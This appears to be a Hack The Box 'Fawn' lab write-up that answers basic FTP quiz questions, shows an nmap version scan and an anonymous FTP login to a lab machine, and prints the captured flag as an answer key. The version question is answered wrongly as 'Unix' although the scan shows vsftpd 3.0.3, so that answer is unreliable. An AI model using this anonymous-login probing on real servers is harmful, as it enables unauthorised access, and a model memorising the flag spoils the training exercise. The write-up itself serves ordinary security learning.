# Fawn

> What does the 3-letter acronym FTP stand for? 

#### File Transfer Protocol 

---

> What communication model does FTP use, architecturally speaking? 

#### Client-Server model 

---

> What is the name of one popular GUI FTP program? 

#### FileZilla 

---

> Which port is the FTP service active on usually? 

#### 21 TCP

---

> What acronym is used for the secure version of FTP? 

#### SFTP 

---

> What is the command we can use to test our connection to the target? 

#### ping 

---

> From your scans, what version is FTP running on the target? 

```console
$ nmap -sV 10.129.137.172
Starting Nmap 7.80 ( https://nmap.org ) at 2021-10-27 22:22 UTC
Nmap scan report for 10.129.137.172
Host is up (0.31s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
Service Info: OS: Unix
```

#### Unix 

---

> Submit root flag 

We can see if using `ftp` gives us some files. We don't have a username, so let's try with the anonymous mode

```console
$ ftp 10.129.137.172
Connected to 10.129.137.172.
220 (vsFTPd 3.0.3)
Name (10.129.137.172:marco): anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```

Now we can to list the files and get the flag

```console
ftp> ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 0        0              32 Jun 04 03:25 flag.txt
226 Directory send OK.
ftp> get flag.txt
local: flag.txt remote: flag.txt
200 PORT command successful. Consider using PASV.
150 Opening BINARY mode data connection for flag.txt (32 bytes).
226 Transfer complete.
32 bytes received in 0.00 secs (262.6050 kB/s)
ftp> bye
221 Goodbye.

$ cat flag.txt
035db21c881520061c53e0536e44f815
```

#### HTB{035db21c881520061c53e0536e44f815}